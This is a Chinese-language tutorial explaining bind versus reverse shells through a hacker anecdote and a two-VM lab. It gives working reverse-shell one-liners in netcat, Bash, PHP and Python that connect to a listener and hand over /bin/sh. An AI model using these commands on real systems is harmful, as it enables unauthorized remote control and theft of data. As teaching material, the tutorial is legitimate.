ailx10说：这篇是2020年8月之前写的，后来又改过。反弹 shell 刚开始容易被一串命令吓住，我就把它拆回两件事：谁提供命令解释器、谁主动发起连接。先用 nc 看 bind 和 reverse 的方向，再把 Bash、PHP、Python 的描述符重定向放到旁边，原本像魔法的代码就有了共同骨架。这篇想讲得快一点，却不是说所有示例都能在所有机器上原样运行。理解连接和标准输入输出怎样接起来以后，换语言也能认出它在做什么，不必每次都靠背另一条长命令。

---

按提供shell方是否监听说明bind与reverse shell，nc示例后给Bash、PHP、Python主动连接与标准描述符重定向。

核查提示：先后顺序不是定义，reverse是执行端主动连接监听方；不保证稳定也不必须两边nc，PHP固定fd3依环境，代码未运行。 原环境、代码和图内细节尚未逐项核验。

本文区分 bind shell 与 reverse shell：关键是提供 shell 的一端监听还是主动连接，启动先后顺序不是定义。命令语法依赖系统和工具版本。

> 黑客控制了目标，弹一个shell，构建一个稳定的通信后门。

- 先弹shell就是正向shell，后连接
- 后弹shell就是反向shell，先监听

---

> **正向shell：客户端想要获得服务端的shell**

- 假设小黑是一名黑客
- 他悄咪咪溜进了知乎总部大楼，发现一台刘看山的电脑，但是刘看山出门了
- 于是小黑通过nc将这台电脑的控制权通过23333端口发射出去
- 小黑做了一系列的操作，又悄咪咪的原路返航
- 回到家后，通过nc连上刘看山的电脑
- 后来，刘看山的隐私泄露了\~
- （这里小黑是客户端，刘看山是服务端，服务端发射shell）

> **反向shell：服务端想要获得客户端的shell（也就是反弹shell）**

- 假设小黑是一名黑客
- 他悄咪咪溜进了知乎总部大楼，发现一台刘看山的电脑，但是刘看山出门了
- 小黑发现电脑里有一个有趣的文件（刘看山的秘密）
- 小黑下载这个文件到自己的U盘里，又悄咪咪的原路返航
- 回到家后，小黑打开这个文件
- 发现电脑被刘看山控制了\~
- （这里小黑是客户端，刘看山是服务端，客户端发射shell）

> **正向shell（服务端送shell）**

- 第一步：在kali rolling（服务端）上监听23333端口，并反弹shell

```
nc -lvp 23333 -e /bin/sh
```

![](/notes-assets/5db830037e033b3067a0.webp)

- 第二步：在ubuntu18（客户端）上连接kali rolling的23333端口
- 这个时候，客户端就拿到服务端的shell控制权了
- 可以随意控制服务端

```
nc 192.168.160.140 23333
```

![](/notes-assets/550eb1669286886c41f3.webp)
> **反向shell（客户端送shell）**

- 第一步：在ubuntu18上选择增强版的netcat
- 一般ubuntu默认的是free-bsd版本的nc

```
update-alternatives --config nc
```

![](/notes-assets/ec4f26ded0a85d6e411e.webp)

- 第二步：在kali rolling上启动服务端，等待客户端上钩
- 客户端只要吃钩子，服务端就获得了客户端的shell控制权
- 可以随意控制客户端

```
nc -lvp 23333
```

![](/notes-assets/de3193c73bb4ac55280a.webp)

- 第三步：在ubuntu18上启动客户端，吃钩子

```
nc 192.168.160.140 23333 -e /bin/sh
```

![](/notes-assets/3e610a8de0a9e309f717.webp)

- 我们发现必须客户端和服务端都安装了nc才能实现反弹shell（反向shell）
- 但是如果其中一方没有安装nc怎么办？

> **bash反弹shell**

- 服务端（kali rolling上监听23333）
- 客户端吃钩子，服务端就成功控制客户端了

![](/notes-assets/b00e4a797c53a1fcae48.webp)

- 客户端（ubuntu18上bash反弹shell）

```
bash -i >& /dev/tcp/192.168.160.140/23333 0>&1
```

![](/notes-assets/b1384f816f3978e38d25.webp)
> **php反弹shell**

- 服务端（kali rolling上监听23333）
- 客户端吃钩子，服务端就成功控制客户端了

![](/notes-assets/e1609cdba998e1ab1df9.webp)

- 客户端（ubuntu18上bash反弹shell）

```
php -r '$f=fsockopen("192.168.160.140",23333);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![](/notes-assets/da0813bc7dc8767d792d.webp)
> **python反弹shell**

- 服务端（kali rolling上监听23333）
- 客户端吃钩子，服务端就成功控制客户端了

![](/notes-assets/0ef53560a36051dd3fdf.webp)

- 客户端（ubuntu18上bash反弹shell）

```
python -c 'import socket,subprocess,os; \
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.160.140",23333));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

![](/notes-assets/9a6520546fbb32206425.webp)

本篇完\~

这几个短例子帮助我看见标准输入输出怎样接上网络，并不意味着连接一定稳定。回看时先跟住方向和进程，换一种语言，也不会完全失去判断依据。
